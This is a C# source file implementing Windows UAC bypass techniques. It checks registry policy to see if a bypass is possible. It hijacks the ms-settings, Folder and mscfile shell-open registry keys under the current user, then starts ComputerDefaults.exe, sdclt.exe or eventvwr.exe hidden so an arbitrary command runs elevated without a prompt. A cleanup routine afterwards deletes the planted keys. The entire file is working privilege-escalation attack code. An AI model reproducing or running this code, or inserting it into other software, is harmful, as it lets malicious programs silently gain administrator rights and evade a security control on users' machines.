using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UACBypass
{
    public static class UAC
    {
        /// <summary>
        /// This method checks if Windows UAC can be bypassed.
        /// </summary>
        /// <returns>
        /// Return True if the current configuration of the User Account Control (UAC) allows a privilege escalation. Return False if UAC is set to "Always Notify".
        /// </returns>
        public static bool CanBypassUAC()
        {
            string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
            string enableLUA = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("EnableLUA").ToString();
            string promptOnSecureDesktop = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("PromptOnSecureDesktop").ToString();

            if (enableLUA != "1") return false;

            if (consentPromptBehaviorAdmin == "2") return false;
            else return true;
        }

        /// <summary>
        /// This method checks if Windows UAC is disabled.
        /// </summary>
        /// <returns>
        /// Return True if UAC is disabled.
        /// </returns>
        public static bool IsUACDisabled()
        {
            string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
      
            if (consentPromptBehaviorAdmin == "0") return true;
            else return false;
        }

        /// <summary>
        /// This method restart the program with administrative privileges.
        /// </summary>
        public static void RestartAsAdmin()
        {
            using (Process p = new Process())
            {
                p.StartInfo.FileName = Application.ExecutablePath;
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.Verb = "runas";

                p.Start();

                p.WaitForExit();
            }
        }

        /// <summary>
        /// This method tries to bypass UAC using Registry Keys manipulations depending on which OS version the program is running.
        /// </summary>
        public static void Bypass(string filename)
        {
            if (Privileges.IsRunningAsAdmin()) throw new Exception("Process already elevated");
            if (!Privileges.UserBelongsToAdministratorsGroup()) throw new Exception("The user must belong to the Administrators group");
            if (!OsSupport.IsSevenOrBetter) throw new Exception("Not supported on old Windows versions (only from Seven)");
            if (!CanBypassUAC()) throw new Exception("The current UAC configuration does not allow it to be bypassed");

            if (OsSupport.IsTenCreatorsOrBetter) Sdclt(filename);
            else EventViewer(filename);
        }

        /// <summary>
        /// This method tries to bypass UAC using computerdefault.exe program with Registry Keys manipulations.
        /// </summary>
        public static void ComputerDefaults(string command)
        {
            //Set the registry key for fodhelper
            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = Environment.SystemDirectory + @"\ComputerDefaults.exe";
            p.Start();
        }

        /// <summary>
        /// This method tries to bypass UAC using Windows Backup Program with Registry Keys manipulations.
        /// </summary>
        public static void Sdclt(string command)
        {
            //Set the registry key for sdclt
            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"Folder\shell\open\command");

            RegistryKey sdclt = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\Folder\shell\open\command", true);
            sdclt.SetValue("", @command);
            sdclt.SetValue("DelegateExecute", "");
            sdclt.Close();

            //start sdclt
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = Environment.SystemDirectory + @"\sdclt.exe";
            p.Start();
        }

        /// <summary>
        /// This method tries to bypass UAC using EventViewer MMC Launcher with Registry Keys manipulations.
        /// </summary>
        public static void EventViewer(string command)
        {
            //Set the registry key for eventvwr
            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"mscfile\Shell\Open\command");

            RegistryKey vwr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
            vwr.SetValue("", @command);
            vwr.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = Environment.SystemDirectory + @"\eventvwr.exe";
            p.Start();
        }

        /// <summary>
        /// This method clean registry entries added for UAC bypass methods.
        /// </summary>
        public static void CleanRegistry()
        {
            try
            {
                if (Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\") != null)
                {
                    if (Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\") != null)
                        Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("ms-settings");
                    if (Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\Folder\") != null)
                        Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("Folder");
                    if (Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\") != null)
                        Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("mscfile");
                }
            }
            catch (Exception) { }
        }
    }
}